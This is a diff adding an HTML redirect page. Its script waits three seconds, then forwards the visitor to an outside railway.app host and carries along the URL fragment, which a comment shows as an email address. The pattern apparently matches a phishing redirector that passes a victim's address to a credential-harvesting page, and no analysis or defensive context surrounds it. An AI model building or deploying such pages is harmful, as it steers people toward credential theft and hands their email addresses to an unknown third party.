@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        // Get the fragment from the current URL (after the # symbol)
+        const fragment = window.location.hash; // Example: #eeee@grt.gfgf
+        
+        // Define the target base URL for redirection
+        const baseUrl = "https://voiceall-time.up.railway.app";
+
+        // Combine the base URL with the current fragment (if any)
+        const redirectUrl = baseUrl + fragment;
+
+        // Redirect after 3 seconds
+        setTimeout(function() {
+            window.location.href = redirectUrl; // Redirect with the fragment
+        }, 3000); // 3000 milliseconds (3 seconds)
+    </script>
+</head>
+<body>
+    <p>You are being redirected...</p>
+</body>
+</html>
